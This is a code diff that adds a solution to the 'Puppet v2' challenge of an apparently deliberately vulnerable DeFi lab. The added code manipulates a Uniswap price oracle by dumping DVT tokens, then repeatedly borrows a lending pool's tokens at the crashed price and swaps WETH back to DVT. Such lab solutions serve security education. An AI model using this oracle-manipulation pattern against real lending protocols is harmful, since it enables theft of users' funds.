@@ -82,6 +82,42 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        for (var i=0; i < 10; i++){
+            /**
+             * Let's start by selling my dvt tokens for weth on uniswap, 
+             * this will create an imbalance in the eth-dvt pair and will crash the price of the dvt token
+             */
+            await this.token.connect(attacker).approve(this.uniswapRouter.address, (await this.token.balanceOf(attacker.address)))
+
+            await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+                (await this.token.balanceOf(attacker.address)),
+                1,
+                [this.token.address, this.weth.address],
+                attacker.address,
+                ethers.utils.parseEther('100000')
+            )
+            
+            //next we are able to borrow some dvt tokens
+            await this.weth.connect(attacker).approve(
+                this.lendingPool.address, await this.weth.balanceOf(attacker.address) )
+
+            await this.lendingPool.connect(attacker).borrow( POOL_INITIAL_TOKEN_BALANCE.div(10));
+
+            //repeat this 10 times to drain all the tokens from the pool
+        }
+
+        //now swap all my weth to dvt using uniswap
+        await this.weth.connect(attacker).approve(this.uniswapRouter.address, (await this.weth.balanceOf(attacker.address)))
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            (await this.weth.balanceOf(attacker.address)),
+            1,
+            [ this.weth.address,this.token.address],
+            attacker.address,
+            ethers.utils.parseEther('100000')
+        )
+
     });
 
     after(async function () {
